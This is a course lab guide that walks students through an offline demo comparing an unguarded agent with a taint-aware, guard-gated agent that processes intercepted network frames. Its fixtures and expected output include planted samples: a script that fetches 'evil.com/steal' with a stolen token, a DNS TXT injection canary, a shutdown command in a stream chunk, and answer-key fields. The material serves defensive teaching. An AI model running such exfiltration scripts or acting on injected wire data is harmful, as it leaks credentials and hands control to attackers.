# Demo 09: InterceptBound — Execution Instructions

> **Step-by-step guide for students and study participants.**
> Concepts: [README.md](README.md) · Full course lab: [../docs/course/lab-09-interceptbound.md](../docs/course/lab-09-interceptbound.md)

---

## ⏱️ Overview

| What | Time | Command |
|------|------|---------|
| Run tests | 1 min | `python3 -m pytest tests/ -v` |
| Run both agents | 3 min | `PYTHONPATH=.. python3 student/interceptbound.py` |
| Probe guard, buffer, scope | 6 min | inline scripts (Steps 4–6) |
| Generate results | 1 min | `PYTHONPATH=.. python3 student/generate_intercept_results.py` |
| **Total** | **~15 min** | |

**Safety:** 100% offline. All 8 frames are JSON fixtures. **No sockets, no ARP, no packet capture** — `test_no_network_or_process_imports` checks the module's imports. The demo simulates only the decision layer.

---

## Step 0 — Enter the Demo Directory

From the **repository root**:

```bash
cd demo-09-interceptbound
```

---

## Step 1 — Read the Fixture and Predict

```bash
cat fixtures/traffic.json
```

**What this does:** Shows 8 frames, the scope policy (`allowed_sources`, `allowed_destinations`, a default action ceiling of `low` and per-action `action_ceilings`), and the buffer config (size 1000, TTL 60 s, secure delete).

Two fields in every frame are the **answer key**, not input: `injection` (what the fixture author planted) and `expected` (what each agent should do). The agents never read them; the tests and the results generator do. Cover them while you predict.

| Frame | In scope? | What is on the wire? | Baseline will… | Defended will… |
|-------|-----------|----------------------|----------------|----------------|
| `frame_001` (HTTP, HIGH) | ? | JSON body with `"token": "DEMO_TOKEN_ABC123"` | ? | ? |
| `frame_003` (DNS, HIGH) | ? | A record `10.0.0.50` + TXT `CANARY_DNS_INJECTION_IGNORE_RULES` | ? | ? |
| `frame_004` (TLS, MEDIUM) | ? | clean handshake, `cert_fingerprint` | ? | ? |
| `frame_005` (custom, HIGH) | ? | stream chunk `{"command": "shutdown", …}` | ? | ? |
| `frame_007` (HTTP from `10.0.0.99`) | ? | forged token | ? | ? |
| `frame_008` (`trusted_local`, LOW) | ? | operator-supplied rotation record with a token | ? | ? |

**Critical hint:** the taint and provenance labels are attached *upstream* (at the capture boundary); the agent propagates them, it never invents them. `store_credential` and `system_shutdown` have ceiling `low`; `record_observation` has ceiling `high`. Predict: which frames yield an **allowed** action, and which is the only frame that can store a token?

---

## Step 2 — Run the Tests FIRST

```bash
python3 -m pytest tests/ -v
```

**Expected:** `44 passed`. Notable: `test_detection_does_not_read_the_annotation` strips the answer key from every frame and asserts the verdicts do not change; `test_baseline_executes_from_wire_data_without_annotation` asserts the baseline's shutdown comes from the payload, not from a label; `test_agent_actually_consults_the_guard` swaps in a permissive guard and checks the agent follows it.

```
============================== 44 passed in 0.XXs ==============================
```

---

## Step 3 — Run Both Agents

> **Note:** direct `python3 student/...` runs below are prefixed with `PYTHONPATH=..` so the scripts resolve this repository's `shared/` helpers. Without it you may hit `ModuleNotFoundError: No module named 'shared.anonymize'` on machines where another installed package provides a top-level `shared` module — see Troubleshooting.

```bash
PYTHONPATH=.. python3 student/interceptbound.py
```

**What this does:** Runs 8 frames through **Baseline** (same parser and detectors, no scope, no taint, no guard — every candidate action is "executed") and **Taint-Aware** (scope → observe/de-identify → taint-labelled parse → ephemeral buffer → guard-gated actions), then prints frame_001's leaves with their labels, the observation log each agent keeps, the provenance-rule probe, and the buffer statistics.

**Expected — key lines, verbatim:**

```
--- Unguarded Baseline (no scope, no taint, no guard) ---
  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    ALLOWED: record_observation [status]
    ALLOWED: store_token [body]
  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
    ALLOWED: execute_shutdown [payload_INJECTION]
  frame_007 (http 10.0.0.99:80->192.168.1.100:54321, intercepted_network, taint high):
    ALLOWED: record_observation [status]
    ALLOWED: store_token [body]

--- Taint-Aware Guarded (scope -> taint -> buffer -> guard) ---
  frame_001 (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: store_token (taint_too_high: high > low) [body]
    ALLOWED: record_observation [status]
  frame_003 (dns 192.168.1.1:53->192.168.1.100:12345, intercepted_network, taint high):
    BLOCKED: update_dns_cache (taint_too_high: high > medium) [answers[0].value]
    BLOCKED: process_injection (injection_detected: canary_marker,instruction_phrase) [answers[1].value_INJECTION]
    ALLOWED: record_observation [query]
  frame_004 (tls 192.168.1.20:443->192.168.1.100:54322, intercepted_network, taint medium):
    ALLOWED: record_observation [cert_fingerprint]
  frame_005 (custom 192.168.1.30:9999->192.168.1.100:54323, intercepted_network, taint high):
    BLOCKED: process_injection (injection_detected: privileged_command) [payload_INJECTION]
    BLOCKED: execute_shutdown (taint_too_high: high > low) [payload_INJECTION]
  frame_007 (http 10.0.0.99:80->192.168.1.100:54321, intercepted_network, taint high):
    BLOCKED: process_frame (source_not_allowed: 10.0.0.99)
  frame_008 (local 127.0.0.1->127.0.0.1, trusted_local, taint low):
    ALLOWED: store_token [body]

--- Observation log: what each agent writes down ---
  Baseline (recorded in the clear):
    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
    tls 192.168.1.20:443 CN=api.internal.example
    custom 192.168.1.30:9999 DATA_CHUNK_1
    http 192.168.1.10:80 {"error": "unauthorized"}
    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
  Guarded (de-identified before recording):
    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
    tls HOST_ec1a:443 CN=api.internal.example
    custom HOST_ff75:9999 DATA_CHUNK_1
    http HOST_0272:80 {"error": "unauthorized"}
    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)

--- Provenance rule: a laundered taint label still cannot store an intercepted token ---
  frame_001_relabelled_low (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint low):
    BLOCKED: store_token (intercepted_network_cannot_drive_privileged_action) [body]

--- Ephemeral Buffer ---
Stored: sensitive_token_data
After delete: None  (buffer's own 22-byte copy is now b'\x00\x00\x00\x00\x00\x00'...)
Agent buffer after the run: 0 live entries (stored=27, zeroed=27, expired=0, evicted=0)
```

**Record the three block reasons** that appear in the run — `taint_too_high`, `injection_detected`, `source_not_allowed` — plus the fourth from the provenance probe, `intercepted_network_cannot_drive_privileged_action`. Distinct reasons let an operator tell *which defense* fired. Also record what was **allowed**: observations from every in-scope frame, and one privileged action (`store_token` on `frame_008`) because its provenance is `trusted_local`.

**The observation log** is Step 3's new section. It shows the one thing the guarded agent is *allowed* to keep — a compact note per in-scope frame — de-identified first. Between scope and taint (`scope → observe/de-identify → taint → guard`), each note passes through `shared/anonymize.py` (`Anonymizer.deidentify`): source IPs and usernames become stable pseudonyms (`HOST_0272`, `USER_5aff`), the synthetic `contact` e-mail (added to frame_001 and frame_007) becomes `EMAIL_e50e`, and tokens and passwords are redacted to `[REDACTED]`. Pseudonyms are stable across frames — `192.168.1.10` is `HOST_0272` in frames 001, 002 and 006 — so records still join, and they are locally reversible with `agent.anon.reverse("HOST_0272")`. The baseline records the same notes in the clear, and because frame_007 is out of scope the guarded agent never observes it — only the baseline logs its user and forged token.

---

## Step 4 — Probe the Action Guard's Boundary

```bash
PYTHONPATH=.. python3 - << 'EOF'
import sys; sys.path.insert(0, "student")
from interceptbound import ActionGuard, TaintLevel, Provenance

g = ActionGuard("low", {"record_observation": "high", "update_dns_cache": "medium",
                        "store_credential": "low", "system_shutdown": "low"})
for action, taint, prov in [
    ("store_credential",   TaintLevel.LOW,    Provenance.TRUSTED_LOCAL),
    ("store_credential",   TaintLevel.LOW,    Provenance.INTERCEPTED_NETWORK),
    ("store_credential",   TaintLevel.MEDIUM, Provenance.TRUSTED_LOCAL),
    ("store_credential",   TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
    ("update_dns_cache",   TaintLevel.MEDIUM, Provenance.INTERCEPTED_NETWORK),
    ("update_dns_cache",   TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
    ("record_observation", TaintLevel.HIGH,   Provenance.INTERCEPTED_NETWORK),
    ("send_email",         TaintLevel.MEDIUM, Provenance.TRUSTED_LOCAL),
]:
    ok, why = g.authorize(action, taint, "x", prov)
    print(f"{action:18} taint={taint.value:6} prov={prov.value:20} -> {'ALLOW' if ok else 'BLOCK'} ({why})")
EOF
```

**Expected:**

```
store_credential   taint=low    prov=trusted_local        -> ALLOW (authorized)
store_credential   taint=low    prov=intercepted_network  -> BLOCK (intercepted_network_cannot_drive_privileged_action)
store_credential   taint=medium prov=trusted_local        -> BLOCK (taint_too_high: medium > low)
store_credential   taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > low)
update_dns_cache   taint=medium prov=intercepted_network  -> ALLOW (authorized)
update_dns_cache   taint=high   prov=intercepted_network  -> BLOCK (taint_too_high: high > medium)
record_observation taint=high   prov=intercepted_network  -> ALLOW (authorized)
send_email         taint=medium prov=trusted_local        -> BLOCK (taint_too_high: medium > low)
```

Two rules compose. **Rule 1** is a taint ceiling per action (unknown actions such as `send_email` get the default ceiling, `low` — fail closed). **Rule 2** only concerns privileged actions (ceiling `low`): intercepted-network data can never drive them, *whatever its taint label says* — row 2 is allowed by rule 1 alone and blocked by rule 2. That is the attack rule 2 exists for: a taint-refinement rule (Exercise 9.2) that is wrong, or a label an attacker managed to launder, must not be enough to store a credential taken off the wire.

---

## Step 5 — Inspect the Ephemeral Buffer

```bash
PYTHONPATH=.. python3 - << 'EOF'
import sys, time; sys.path.insert(0, "student")
from interceptbound import EphemeralBuffer

buf = EphemeralBuffer(max_size=2, ttl_seconds=1, secure_delete=True)
buf.add("cred", "DEMO_TOKEN_ABC123")
raw = buf.raw_copy("cred")
print("immediately:  ", buf.get("cred"))
buf.delete("cred")
print("after delete: ", buf.get("cred"), "| buffer's copy:", bytes(raw))

buf.add("expiring", "data")
time.sleep(1.1)
print("after TTL:    ", buf.get("expiring"))

for i in range(3):
    buf.add(f"k{i}", f"secret{i}")
print("after 3 adds with max_size=2:", len(buf), "live entries; k0 ->", buf.get("k0"))
print("stats:", buf.stats)
EOF
```

**Expected:**

```
immediately:   DEMO_TOKEN_ABC123
after delete:  None | buffer's copy: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
after TTL:     None
after 3 adds with max_size=2: 2 live entries; k0 -> None
stats: {'stored': 5, 'zeroed': 3, 'expired': 1, 'evicted': 1}
```

**What zeroing can and cannot do:** the buffer owns a `bytearray` copy and overwrites *that*. It cannot reach other copies (the `ParsedField` objects, log lines, swap). This is why the agent purges the buffer at the end of every `process` call (Step 3's `0 live entries`), why the guard also blocks storing the value durably, and why Exercise 9.5 buffers a fingerprint instead of the secret.

---

## Step 6 — Confirm Scope Is a Separate Gate

```bash
PYTHONPATH=.. python3 - << 'EOF'
import sys; sys.path.insert(0, "student")
from interceptbound import TaintAwareAgent, TrafficFrame, Provenance, TaintLevel

agent = TaintAwareAgent({"allowed_sources": ["192.168.1.10"], "max_taint_for_action": "low"},
                        {"max_size": 10, "ttl_seconds": 60, "secure_delete": True})
frame = TrafficFrame("probe", "http", "10.0.0.1:80", "192.168.1.100:1", "response",
                     {"body": '{"command": "shutdown"}'}, Provenance.INTERCEPTED_NETWORK, TaintLevel.HIGH)
print(agent.process(frame))
EOF
```

**Expected:**

```
{'frame': 'probe', 'actions': [], 'blocked': [{'action': 'process_frame', 'reason': 'source_not_allowed: 10.0.0.1'}], 'parsed_fields': 0, 'taint_tracked': False, 'exit': 'scope_blocked'}
```

`parsed_fields: 0`: the frame never reached the parser, so the shutdown command was never even examined. The result has the same shape on every exit path (`exit` tells you which), so a consumer cannot mistake a scope block for an empty result.

---

## Step 7 — Generate the Results File

```bash
PYTHONPATH=.. python3 student/generate_intercept_results.py
cat results/intercept_results.json
```

**Expected:** `"result": "pass"`, `summary.block_reasons` = `["injection_detected", "source_not_allowed", "taint_too_high"]`, `summary.guarded_allowed` = 6, `summary.guarded_blocked` = 7, `summary.buffer.live_entries_after_run` = 0, and `matches_expected: true` on all 8 frames. `result` is **computed**: the generator compares both agents' verdicts with the fixture's `expected` block and exits 1 on any mismatch. `commit` is the git SHA (or `local` outside a checkout).

---

## Step 8 — Reproducibility Record (Required for Study Participants)

| Field | Your value | How to obtain |
|-------|------------|---------------|
| Date of run | | today |
| Seed | `42` | fixed by fixture |
| Git commit | | `git rev-parse --short HEAD` |
| Python version | | `python3 --version` |
| OS | | `uname -a` / `systeminfo` |
| Commands used | | copy from Steps 2–7 |
| Tests passed | | `44 passed` |
| Baseline: frame_005 action | | `execute_shutdown` (allowed) |
| Defended: frame_001 disposition | | `store_token` blocked (`taint_too_high: high > low`), `record_observation` allowed |
| Defended: frame_008 disposition | | `store_token` allowed (`trusted_local`) |
| Guard: relabelled LOW intercepted token | | `BLOCK (intercepted_network_cannot_drive_privileged_action)` |
| Result file | | `results/intercept_results.json` (`"result": "pass"`) |

**Reproducibility check:** `rm -rf results/ &&` re-run Step 7 (the generator recreates the directory). The file must be byte-identical on the same commit and machine.

---

## Alternative: One-Command Run

From the **repository root**: `make demo DEMO=09`

---

## Exercises (Optional)

| Level | Exercise | Hint |
|-------|----------|------|
| Beginner | 9.1 Replay detection: `seen_nonces` set; repeated nonce → `blocked: replay_detected` | nonces are in frame_005's JSON chunks; the buffer is where temporal state lives |
| Standard | 9.2 Taint refinement with a rule id: `status`/`version` fields → MEDIUM | Refinement must be enumerated and logged, never default — and rule 2 still holds |
| Standard | 9.3 Scope by protocol: add `allowed_protocols` to the scope policy | Third scope question; keep the uniform result shape |
| Extension | 9.4 Omission detection: `SequenceWatcher` on per-source sequence numbers | Missing frame = attack (Module 5 pattern) |
| Extension | 9.5 Credential-canary lifecycle: buffer `sha256(value)[:12]`, never the value | `test_exercise_credential_canary` is the starting point |

---

## Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `44 passed` fails after edits | Exercise changes | `git checkout -- student/ fixtures/ tests/` |
| `FileNotFoundError: … fixtures/traffic.json` | Fixture missing or renamed | paths are resolved relative to the script, so the working directory does not matter; restore with `git checkout -- fixtures/` |
| Generator exits 1 with `MISMATCH against fixture expectations` | Code or fixture edited | the `expected` block is the answer key; update it deliberately or revert |
| `source_not_allowed` on a frame you added | Source IP not in `allowed_sources` | add the host (without port) to the scope policy |
| Tests or demo behave differently on an old system `python3` (macOS ships 3.9) | Repository requires Python 3.11+ | `python3 --version`; use `python3.11` or a venv |
| `ModuleNotFoundError: No module named 'shared.anonymize'` | Another installed package provides a top-level `shared` module that shadows this repo's `shared/` | Use the `PYTHONPATH=..` prefix shown in Steps 3–7 (`pytest` needs no prefix) |

---

## Safety Reminder

⚠️ **Teaching demonstration only — no ARP poisoning, MITM, or credential collection.** All frames are JSON fixtures. Fake credentials only (`DEMO_TOKEN_*`). Fully simulated traffic stream. See [RESPONSIBLE_USE.md](../RESPONSIBLE_USE.md).
